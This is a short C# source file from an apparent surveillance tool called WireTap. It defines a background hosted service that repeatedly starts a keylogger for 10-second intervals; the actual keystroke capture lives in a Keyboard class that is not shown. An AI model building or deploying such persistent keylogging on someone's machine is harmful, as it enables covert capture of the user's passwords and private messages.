namespace WireTap.HostedService
{
    using System;
    using System.Threading;
    using System.Threading.Tasks;
    using Microsoft.Extensions.Hosting;

    internal class KeyloggerService : ServiceBase, IHostedService
    {
        protected override async Task InternalExecuteAsync(CancellationToken cancellationToken)
        {
            Console.WriteLine("Execuing KeyloggerService InternalExecuteAsync");

            while (!cancellationToken.IsCancellationRequested)
            {
                StartKeyLogger();
            }
        }

        protected void StartKeyLogger()
        {
            var duration = TimeSpan.FromSeconds(10);
            var keyboard = new Keyboard();

            keyboard.StartKeylogger(duration);

            // Cannot use duration FromSeconds due to TraceListener trying to 
            //new Keyboard().StartKeylogger(default);
        }
    }
}